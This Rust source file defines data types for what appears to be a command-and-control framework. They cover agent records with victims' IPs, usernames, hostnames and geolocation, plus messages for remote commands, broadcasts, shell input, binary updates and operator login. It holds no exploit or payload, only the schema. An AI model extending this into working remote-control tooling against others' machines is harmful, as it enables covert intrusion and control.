use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::fmt;
use sqlx::FromRow;

#[derive(Debug, Serialize, Deserialize, FromRow, Clone)]
pub struct Agent {
    pub id: Option<i32>,
    pub uuid: String,
    pub ip: String,
    pub username: String,
    pub hostname: String,
    pub country: String,
    pub city: String,
    pub region: String,
    pub latitude: f64,
    pub longitude: f64,
    pub online: bool,
    pub last_seen: DateTime<Utc>,
}

impl fmt::Display for Agent {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "\nAgent UUID: {}\nIP: {}\nUsername: {}\nHostname: {}\nOnline: {}\nLast Seen: {}\nCountry: {}\nCity: {}\nRegion: {}\nLatitude: {}\nLongitude: {}",
            self.uuid,
            self.ip,
            self.username,
            self.hostname,
            self.online,
            self.last_seen.to_rfc3339(),
            self.country,
            self.city,
            self.region,
            self.latitude,
            self.longitude,
        )
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, FromRow)]
pub struct ScheduledTask {
    pub id: i32,
    pub command_type: String,
    pub args: serde_json::Value,
    #[serde(with = "chrono::serde::ts_seconds")]
    pub execute_at: DateTime<Utc>,
    pub executed: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Location {
    pub country: String,
    pub city: String,
    pub region: String,
    pub latitude: f64,
    pub longitude: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum C2Message {
    Ping,
    Pong,
    Command {
        uuid: String,
        cmd: String,
    },
    Broadcast {
        cmd: String,
    },
    StatusUpdate {
        uuid: String,
        online: bool,
    },
    RequestAgentList,
    AgentStatus {
        uuid: String,
        online: bool,
    },
    AgentList {
        agents: Vec<Agent>,
        total: usize,
        online: usize,
    },
    RequestAgentDetails {
        identifier: String,
    },
    AgentDetails {
        agent: Option<Agent>,
    },
    CommandResponse {
        output: String,
    },
    AgentRegister {
        uuid: String,
        ip: String,
        username: String,
        hostname: String,
        country: String,
        city: String,
        region: String,
        latitude: f64,
        longitude: f64,
        version: String,
    },
    ShellInput {
        uuid: String,
        input: String,
    },
    VersionCheck {
        uuid: String,
        agent_version: String,
    },
    VersionResponse {
        version: String,
    },
    AgentSoftwareUpdateWithBinary {
        version: String,
        binary: Vec<u8>,
    },
    UpdateSoftwareWithBinary {
        version: String,
        binary: Vec<u8>,
    },
    VersionCheckAck {},
    Authenticate {
        operator_id: String,
        token: String,
    },
    AuthResponse {
        success: bool,
        message: String,
    },
    RequestScheduledTasks {
        show_all: bool,
    },
    ScheduledTasks { tasks: Vec<ScheduledTask> },
    CancelScheduledTask {
        task_id: i32,
    },
    CancelTaskResponse {
        success: bool,
        message: String,
    },
}